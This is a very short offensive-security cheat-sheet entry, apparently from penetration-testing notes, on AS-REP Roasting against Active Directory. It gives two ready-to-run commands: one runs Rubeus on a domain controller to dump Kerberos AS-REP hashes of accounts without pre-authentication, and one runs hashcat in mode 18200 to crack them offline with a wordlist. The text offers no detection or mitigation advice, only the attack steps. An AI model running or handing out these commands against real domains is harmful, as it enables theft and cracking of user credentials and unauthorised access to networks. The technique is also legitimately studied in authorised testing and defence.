**AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled**

Run the following in the domain controller, and then copy the hash
```CMD
Rubeus.exe asreproast
```

Crack the hash using the following command
```Shell
hashcat -a 0 -m 18200 hash.txt Pass.txt
```